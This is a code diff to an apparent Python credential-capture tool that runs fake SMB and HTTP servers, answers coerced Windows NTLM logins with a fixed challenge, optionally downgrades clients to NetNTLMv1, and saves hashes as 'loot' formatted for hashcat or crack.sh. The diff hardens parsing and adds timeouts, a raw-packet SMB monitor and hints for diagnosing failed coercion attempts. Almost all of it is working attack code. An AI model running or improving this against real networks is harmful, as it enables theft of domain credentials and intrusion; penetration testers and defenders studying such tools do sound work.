@@ -38,12 +38,14 @@ import ssl
 import struct
 import sys
 import threading
+import time
 import traceback
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 # ---- NTLM constants --------------------------------------------------------
 
 NTLMSSP_SIG = b"NTLMSSP\x00"
+MAX_MESSAGE_SIZE = 1024 * 1024
 
 # Type-2 negotiate flags. 0xe2898215 is the usual set; clearing ESS
 # (0x00080000) -> 0xe2818215 asks the client to drop NTLM2 session security and
@@ -130,22 +132,32 @@ class Type3:
 
 def parse_type3(data):
     """Parse an NTLM Type-3 message. `data` must start at the NTLMSSP sig."""
+    if len(data) < 52 or data[:8] != NTLMSSP_SIG or _u32(data, 8) != 3:
+        raise ValueError("invalid or truncated NTLM Type-3 message")
+
+    def field(name, len_off, off_off, text=False):
+        size = _u16(data, len_off)
+        offset = _u32(data, off_off)
+        if offset > len(data) or size > len(data) - offset:
+            raise ValueError("%s field points outside Type-3 message" % name)
+        if text and size % 2:
+            raise ValueError("%s field has odd UTF-16 length" % name)
+        value = data[offset:offset + size]
+        return value.decode("utf-16-le", "replace") if text else value
+
     t = Type3()
-    lm_len = _u16(data, 12); lm_off = _u32(data, 16)
-    nt_len = _u16(data, 20); nt_off = _u32(data, 24)
-    dom_len = _u16(data, 28); dom_off = _u32(data, 32)
-    usr_len = _u16(data, 36); usr_off = _u32(data, 40)
-    hst_len = _u16(data, 44); hst_off = _u32(data, 48)
-
-    t.lm = data[lm_off:lm_off + lm_len]
-    t.nt = data[nt_off:nt_off + nt_len]
-    t.domain = data[dom_off:dom_off + dom_len].decode("utf-16-le", "replace")
-    t.user = data[usr_off:usr_off + usr_len].decode("utf-16-le", "replace")
-    t.host = data[hst_off:hst_off + hst_len].decode("utf-16-le", "replace")
+    t.lm = field("LM response", 12, 16)
+    t.nt = field("NT response", 20, 24)
+    t.domain = field("domain", 28, 32, text=True)
+    t.user = field("user", 36, 40, text=True)
+    t.host = field("workstation", 44, 48, text=True)
     t.flags = _u32(data, 60) if len(data) >= 64 else 0
-    t.raw_len = nt_len
+    t.raw_len = len(t.nt)
 
-    t.is_v1 = nt_len == 24
+    if t.nt and len(t.nt) != 24 and len(t.nt) < 32:
+        raise ValueError("unsupported NT response length: %d" % len(t.nt))
+
+    t.is_v1 = len(t.nt) == 24
     # NTLM2 session response (v1 shape + ESS): 24-byte NT, LM = 8-byte client
     # challenge + zero padding. Not crack.sh-friendly.
     t.is_v1_ess = (
@@ -264,11 +276,17 @@ class Sink:
         self.outdir = outdir
         self.challenge_hex = challenge_hex
         self.lock = threading.Lock()
-        self.seen = set()
         os.makedirs(outdir, exist_ok=True)
         self.v1_file = os.path.join(outdir, "netntlmv1.txt")
         self.v2_file = os.path.join(outdir, "netntlmv2.txt")
         self.log_file = os.path.join(outdir, "capture.log")
+        self.seen = set()
+        for path in (self.v1_file, self.v2_file):
+            try:
+                with open(path, "r") as fh:
+                    self.seen.update(line.strip() for line in fh if line.strip())
+            except FileNotFoundError:
+                pass
 
     def handle(self, client_ip, t, source):
         # Null / anonymous session: no NT response and no user -> nothing to
@@ -288,10 +306,9 @@ class Sink:
             hashline = format_v2(t, self.challenge_hex)
             mode = "5600"
 
-        key = (source, t.user.lower(), t.host.lower(), hashline)
         with self.lock:
-            dup = key in self.seen
-            self.seen.add(key)
+            dup = hashline in self.seen
+            self.seen.add(hashline)
 
         C = Color
         print(C.b("\n[+] [%s] NTLM %s captured  <- %s" % (source, kind, client_ip)))
@@ -302,8 +319,8 @@ class Sink:
               % (len(t.nt), len(t.lm)))
         print("    neg flags   : 0x%08x" % t.flags)
         if t.is_v1_ess:
-            print(C.y("    ! NTLM2 session security (ESS) — client kept ESS "
-                      "despite downgrade; NOT crack.sh-friendly."))
+            print(C.y("    ! NTLM2 session security (ESS) — hashcat -m 5500 "
+                      "supports it, but crack.sh does not."))
         elif t.is_v1:
             print(C.g("    * downgrade OK — pure NetNTLMv1, crackable with the "
                       "fixed challenge (crack.sh / hashcat -m 5500)."))
@@ -377,16 +394,20 @@ class _Tee:
 class _Loud:
     """Mixin: announce every accepted TCP connection + surface handler errors."""
 
-    def _loud_init(self, tag, verbose):
+    def _loud_init(self, tag, verbose, socket_timeout):
         self._tag = tag
         self._verbose = verbose
         self._counter = itertools.count(1)
         self._clock = threading.Lock()
+        self._accepted = 0
+        self._socket_timeout = socket_timeout
 
     def get_request(self):
         sock, addr = self.socket.accept()
         with self._clock:
             n = next(self._counter)
+            self._accepted += 1
+        sock.settimeout(self._socket_timeout)
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         print(Color.d("[%s conn #%d %s] TCP from %s:%d"
                       % (self._tag, n, ts, addr[0], addr[1])))
@@ -398,6 +419,11 @@ class _Loud:
             print(Color.y("[!] TLS error from %s: %s (plaintext to HTTPS?)"
                           % (client_address[0], exc)))
             return
+        if isinstance(exc, (socket.timeout, TimeoutError)):
+            print(Color.y("[!] %s timeout from %s — TCP reached the listener, "
+                          "but the request did not complete"
+                          % (self._tag, client_address[0])))
+            return
         if isinstance(exc, (ConnectionResetError, BrokenPipeError, OSError)):
             print(Color.d("[%s conn %s] closed/reset"
                           % (self._tag, client_address[0])))
@@ -406,6 +432,138 @@ class _Loud:
                       % (self._tag, client_address[0], exc)))
         if self._verbose:
             traceback.print_exc()
+
+
+# ---- raw TCP visibility for SMB -------------------------------------------
+
+class SMBWireMonitor:
+    """Show TCP attempts to the SMB port, including incomplete handshakes.
+
+    Linux AF_PACKET sees SYN/RST packets before they reach the TCP listener.
+    This requires root/CAP_NET_RAW; the SMB listener still works without it.
+    """
+
+    def __init__(self, port, interface=None):
+        self.port = port
+        self.interface = interface
+        self.stop = threading.Event()
+        self.sock = None
+        self.flows = {}
+        self.lock = threading.Lock()
+
+    def start(self):
+        if not hasattr(socket, "AF_PACKET"):
+            print(Color.y("  [!] SMB wire monitor unavailable on this OS; "
+                          "TCP accept logging remains active"))
+            return False
+        try:
+            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
+                                      socket.htons(0x0003))
+            if self.interface:
+                self.sock.bind((self.interface, 0))
+            self.sock.settimeout(1.0)
+        except (PermissionError, OSError) as e:
+            print(Color.y("  [!] SMB wire monitor unavailable (%s); run with "
+                          "root/CAP_NET_RAW to see failed TCP handshakes" % e))
+            return False
+        threading.Thread(target=self._run, daemon=True).start()
+        threading.Thread(target=self._diagnose, daemon=True).start()
+        scope = " on %s" % self.interface if self.interface else ""
+        print("  [+] SMB wire monitor active for TCP/%d%s "
+              "(SYN/RST/FIN/data)" % (self.port, scope))
+        return True
+
+    @staticmethod
+    def _parse(packet):
+        if len(packet) < 14:
+            return None
+        eth_type = struct.unpack("!H", packet[12:14])[0]
+        off = 14
+        if eth_type in (0x8100, 0x88A8) and len(packet) >= 18:
+            eth_type = struct.unpack("!H", packet[16:18])[0]
+            off = 18
+        if eth_type != 0x0800 or len(packet) < off + 20:  # IPv4
+            return None
+        ihl = (packet[off] & 0x0F) * 4
+        if ihl < 20 or len(packet) < off + ihl + 20 or packet[off + 9] != 6:
+            return None
+        total = struct.unpack("!H", packet[off + 2:off + 4])[0]
+        src = socket.inet_ntoa(packet[off + 12:off + 16])
+        dst = socket.inet_ntoa(packet[off + 16:off + 20])
+        tcp = off + ihl
+        sport, dport, seq, ack = struct.unpack("!HHII", packet[tcp:tcp + 12])
+        data_off = (packet[tcp + 12] >> 4) * 4
+        flags = packet[tcp + 13]
+        payload = max(0, total - ihl - data_off)
+        return src, dst, sport, dport, seq, ack, flags, payload
+
+    @staticmethod
+    def _flag_names(flags):
+        names = []
+        for bit, name in ((0x02, "SYN"), (0x10, "ACK"), (0x04, "RST"),
+                          (0x01, "FIN"), (0x08, "PSH")):
+            if flags & bit:
+                names.append(name)
+        return "+".join(names) or "none"
+
+    def _run(self):
+        while not self.stop.is_set():
+            try:
+                parsed = self._parse(self.sock.recv(65535))
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            if not parsed:
+                continue
+            src, dst, sport, dport, seq, ack, flags, payload = parsed
+            inbound = dport == self.port
+            outbound = sport == self.port
+            if not (inbound or outbound):
+                continue
+            key = (src, sport) if inbound else (dst, dport)
+            now = time.monotonic()
+            with self.lock:
+                if inbound and flags & 0x02 and not flags & 0x10:
+                    self.flows[key] = [now, "syn", False]
+                elif outbound and flags & 0x12 == 0x12 and key in self.flows:
+                    self.flows[key][1] = "synack"
+                elif inbound and flags & (0x04 | 0x01):
+                    self.flows.pop(key, None)
+                elif inbound and (flags & 0x10 or payload) and key in self.flows:
+                    self.flows[key][1] = "connected"
+            if not (flags & 0x07 or payload):
+                continue
+            direction = "-> listener" if inbound else "<- listener"
+            print(Color.d("[smb wire] %s:%d -> %s:%d %s flags=%s seq=%d "
+                          "ack=%d data=%d"
+                          % (src, sport, dst, dport, direction,
+                             self._flag_names(flags), seq, ack, payload)))
+
+    def _diagnose(self):
+        while not self.stop.wait(1.0):
+            now = time.monotonic()
+            with self.lock:
+                pending = [(key, state) for key, state in self.flows.items()
+                           if not state[2] and state[1] != "connected"
+                           and now - state[0] >= 5]
+                for _, state in pending:
+                    state[2] = True
+            for (ip, port), state in pending:
+                if state[1] == "syn":
+                    reason = ("SYN reached this host, but no SYN-ACK was seen; "
+                              "check local firewall/listener/routing")
+                else:
+                    reason = ("SYN and SYN-ACK were seen, but the client did "
+                              "not finish the TCP handshake; return path or "
+                              "remote firewall may be blocking it")
+                print(Color.y("[!] SMB TCP attempt from %s:%d failed: %s"
+                              % (ip, port, reason)))
+
+    def close(self):
+        self.stop.set()
+        if self.sock:
+            self.sock.close()
 
 
 # ---- SMB server ------------------------------------------------------------
@@ -426,6 +584,8 @@ def _read_smb(sock):
     if not hdr:
         return None
     length = struct.unpack(">I", hdr)[0] & 0x00FFFFFF
+    if length > MAX_MESSAGE_SIZE:
+        raise ValueError("SMB frame too large: %d bytes" % length)
     return _recvn(sock, length)
 
 
@@ -434,10 +594,37 @@ def _frame(msg):
 
 
 class SMBHandler(socketserver.BaseRequestHandler):
+    _FAILURE_HINTS = {
+        "tcp": ("TCP handshake completed, but no complete SMB frame arrived; "
+                "the client stopped early or SMB was blocked after connect"),
+        "non-smb": ("TCP reached port 445, but the payload was not SMB; check "
+                    "the coercion target/port and any redirecting proxy"),
+        "smb": ("SMB traffic arrived, but no supported NEGOTIATE or "
+                "SESSION_SETUP completed"),
+        "negotiate": ("SMB negotiation completed, but the client did not send "
+                      "an NTLM Type-1; NTLM may be disabled or Kerberos/policy "
+                      "stopped fallback"),
+        "session-no-ntlm": ("SMB SESSION_SETUP arrived without an NTLMSSP "
+                            "token; the client may be attempting Kerberos only"),
+        "ntlm-unsupported": ("an unsupported NTLMSSP message type arrived"),
+        "type1": ("NTLM Type-1 arrived and the challenge was sent, but no "
+                  "Type-3 returned; check client NTLM policy, return-path "
+                  "filtering, or target-side cancellation"),
+        "type3-invalid": ("NTLM Type-3 arrived but was malformed or unsupported"),
+    }
+
+    def _stage(self, stage):
+        if self.stage == stage:
+            return
+        self.stage = stage
+        print(Color.d("    [smb] %s attempt stage: %s"
+                      % (self.client_address[0], stage)))
+
     def handle(self):
         srv = self.server
         ip = self.client_address[0]
         self.session_id = struct.unpack("<Q", os.urandom(8))[0]
+        self.stage = "tcp"
         try:
             while True:
                 msg = _read_smb(self.request)
@@ -446,13 +633,26 @@ class SMBHandler(socketserver.BaseRequestHandler):
                 out = self._process(msg, srv, ip)
                 if out:
                     self.request.sendall(_frame(out))
+        except socket.timeout:
+            print(Color.y("    [smb] %s timed out — TCP connected, but the SMB "
+                          "exchange did not complete" % ip))
+        except ValueError as e:
+            print(Color.y("    [smb] malformed request from %s: %s" % (ip, e)))
         except (ConnectionResetError, BrokenPipeError, OSError):
-            pass
+            print(Color.d("    [smb] %s disconnected before authentication "
+                          "completed" % ip))
+        finally:
+            hint = self._FAILURE_HINTS.get(self.stage)
+            if hint:
+                print(Color.y("[!] SMB coercion attempt from %s:%d stopped at "
+                              "%s: %s"
+                              % (ip, self.client_address[1], self.stage, hint)))
 
     def _process(self, msg, srv, ip):
         v = srv._verbose
         # SMB1 multi-protocol negotiate -> switch the client up to SMB2.
         if msg[:4] == b"\xffSMB":
+            self._stage("smb")
             if len(msg) > 4 and msg[4] == 0x72:
                 if v:
                     print(Color.d("    [smb] %s SMB1 negotiate -> offering SMB2"
@@ -461,26 +661,36 @@ class SMBHandler(socketserver.BaseRequestHandler):
             return None
 
         if msg[:4] != SMB2_MAGIC:
+            self._stage("non-smb")
             print(Color.y("    [smb] %s sent non-SMB data (%d bytes) — ignoring"
                           % (ip, len(msg))))
             return None
+
+        self._stage("smb")
+        if len(msg) < 64:
+            raise ValueError("truncated SMB2 header (%d bytes)" % len(msg))
 
         cmd = _u16(msg, 12)
         msg_id = struct.unpack("<Q", msg[24:32])[0]
         req_sess = struct.unpack("<Q", msg[40:48])[0]
 
         if cmd == 0x0000:  # NEGOTIATE
+            self._stage("negotiate")
             print(Color.d("    [smb] %s NEGOTIATE" % ip))
             return smb2_negotiate_resp(msg_id, 0x0210, spnego_neg_init())
 
         if cmd == 0x0001:  # SESSION_SETUP
             idx = msg.find(NTLMSSP_SIG)
             if idx == -1:
+                self._stage("session-no-ntlm")
                 return smb2_session_setup_resp(
                     msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")
             ntlm = msg[idx:]
+            if len(ntlm) < 12:
+                raise ValueError("truncated NTLMSSP message")
             mtype = _u32(ntlm, 8)
             if mtype == 1:
+                self._stage("type1")
                 print(Color.d("    [smb] %s SESSION_SETUP (Type-1) -> challenge "
                               "%s ess=%s"
                               % (ip, srv.sink.challenge_hex,
@@ -495,12 +705,15 @@ class SMBHandler(socketserver.BaseRequestHandler):
                 try:
                     t = parse_type3(ntlm)
                     srv.sink.handle(ip, t, "SMB")
+                    self._stage("captured")
                 except Exception as e:
+                    self._stage("type3-invalid")
                     print(Color.y("    [!] SMB Type-3 parse failed from %s: %s"
                                   % (ip, e)))
                 return smb2_session_setup_resp(
                     msg_id, req_sess or self.session_id,
                     STATUS_LOGON_FAILURE, b"")
+            self._stage("ntlm-unsupported")
             return smb2_session_setup_resp(
                 msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")
 
@@ -514,9 +727,9 @@ class LoudSMBServer(_Loud, socketserver.ThreadingTCPServer):
     daemon_threads = True
 
     def __init__(self, addr, sink, challenge8, domain, computer,
-                 downgrade, verbose):
+                 downgrade, verbose, socket_timeout):
         super().__init__(addr, SMBHandler)
-        self._loud_init("smb", verbose)
+        self._loud_init("smb", verbose, socket_timeout)
         self.sink = sink
         self.challenge8 = challenge8
         self.domain = domain
@@ -536,6 +749,10 @@ def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):
         def log_message(self, *a):
             pass
 
+        def log_error(self, fmt, *args):
+            print(Color.y("    [http] %s — request did not complete: %s"
+                          % (self.client_address[0], fmt % args)))
+
         def _finish_empty(self, code, extra=None):
             self.send_response(code)
             self.send_header("Server", "Microsoft-IIS/10.0")
@@ -550,10 +767,23 @@ def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):
             state = "no-auth" if not auth else auth.split(" ", 1)[0]
             print(Color.d("    [http] %s %s from %s (auth: %s)"
                           % (self.command, self.path, ip, state)))
-            clen = int(self.headers.get("Content-Length", 0) or 0)
+            try:
+                clen = int(self.headers.get("Content-Length", 0) or 0)
+            except ValueError:
+                print(Color.y("    [http] invalid Content-Length from %s" % ip))
+                return self._finish_empty(400)
+            if clen < 0 or clen > MAX_MESSAGE_SIZE:
+                print(Color.y("    [http] rejected body of %d bytes from %s"
+                              % (clen, ip)))
+                return self._finish_empty(413)
             if clen:
                 try:
                     self.rfile.read(clen)
+                except socket.timeout:
+                    self.close_connection = True
+                    print(Color.y("    [http] %s timed out while sending the "
+                                  "request body" % ip))
+                    return
                 except Exception:
                     pass
 
@@ -566,8 +796,9 @@ def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):
             if not up.startswith("NTLM ") and not up.startswith("NEGOTIATE "):
                 return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])
             try:
-                token = base64.b64decode(auth.split(" ", 1)[1].strip())
-            except Exception:
+                token = base64.b64decode(auth.split(" ", 1)[1].strip(),
+                                         validate=True)
+            except (ValueError, binascii.Error):
                 return self._finish_empty(400)
             if token[:8] != NTLMSSP_SIG:
                 return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])
@@ -590,7 +821,8 @@ def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):
                 self.send_header("Content-Type", "text/plain")
                 self.send_header("Content-Length", str(len(body)))
                 self.end_headers()
-                self.wfile.write(body)
+                if self.command != "HEAD":
+                    self.wfile.write(body)
                 return
             return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])
 
@@ -608,9 +840,9 @@ class LoudHTTPServer(_Loud, ThreadingHTTPServer):
     allow_reuse_address = True
     daemon_threads = True
 
-    def __init__(self, addr, handler, verbose):
+    def __init__(self, addr, handler, verbose, socket_timeout):
         super().__init__(addr, handler)
-        self._loud_init("http", verbose)
+        self._loud_init("http", verbose, socket_timeout)
 
 
 def ensure_selfsigned(certdir):
@@ -677,8 +909,20 @@ def main():
     p.add_argument("--key", help="TLS key PEM")
     p.add_argument("-v", "--verbose", action="store_true",
                    help="log the per-message SMB/HTTP handshake steps")
+    p.add_argument("--socket-timeout", type=float, default=15.0,
+                   help="seconds before an incomplete client is reported and "
+                        "closed (default 15)")
+    p.add_argument("--no-wire-monitor", action="store_true",
+                   help="disable raw TCP diagnostics for the SMB port")
+    p.add_argument("--wire-interface",
+                   help="capture SMB TCP diagnostics only on this interface "
+                        "(for example eth0)")
     p.add_argument("--no-color", action="store_true", help="disable ANSI color")
     args = p.parse_args()
+    if args.socket_timeout <= 0:
+        p.error("--socket-timeout must be > 0")
+    if bool(args.cert) != bool(args.key):
+        p.error("--cert and --key must be provided together")
 
     try:
         sys.stdout.reconfigure(line_buffering=True)
@@ -710,6 +954,7 @@ def main():
 
     servers = []
     threads = []
+    wire_monitor = None
 
     def start(server, label):
         th = threading.Thread(target=server.serve_forever, daemon=True)
@@ -730,7 +975,11 @@ def main():
         try:
             smb = LoudSMBServer((args.bind, args.smb_port), sink, challenge8,
                                 args.domain, args.computer, args.downgrade,
-                                args.verbose)
+                                args.verbose, args.socket_timeout)
+            if not args.no_wire_monitor:
+                wire_monitor = SMBWireMonitor(args.smb_port,
+                                              args.wire_interface)
+                wire_monitor.start()
             start(smb, "SMB   listening on %s:%d" % (args.bind, args.smb_port))
         except PermissionError:
             print(Color.y("  [!] SMB %d needs root (try sudo, or --smb-port)"
@@ -745,7 +994,7 @@ def main():
                                         args.computer, args.downgrade,
                                         args.verbose)
             http = LoudHTTPServer((args.bind, args.http_port), handler,
-                                  args.verbose)
+                                  args.verbose, args.socket_timeout)
             use_tls = args.tls or args.cert
             if use_tls:
                 if args.cert and args.key:
@@ -755,7 +1004,8 @@ def main():
                         os.path.join(args.outdir, "certs"))
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                 ctx.load_cert_chain(cert, key)
-                http.socket = ctx.wrap_socket(http.socket, server_side=True)
+                http.socket = ctx.wrap_socket(
+                    http.socket, server_side=True, do_handshake_on_connect=False)
             scheme = "https" if use_tls else "http"
             start(http, "HTTP  listening on %s://%s:%d"
                   % (scheme, args.bind, args.http_port))
@@ -772,10 +1022,13 @@ def main():
 
     print(Color.d("  no poisoning / no relay — point coerced auth here "
                   "yourself.  Ctrl-C to stop.\n"))
+
     try:
         threading.Event().wait()
     except KeyboardInterrupt:
         print("\n[*] stopping...")
+        if wire_monitor:
+            wire_monitor.close()
         for s in servers:
             s.shutdown()
         print("[*] stopped. loot in %s/" % args.outdir)
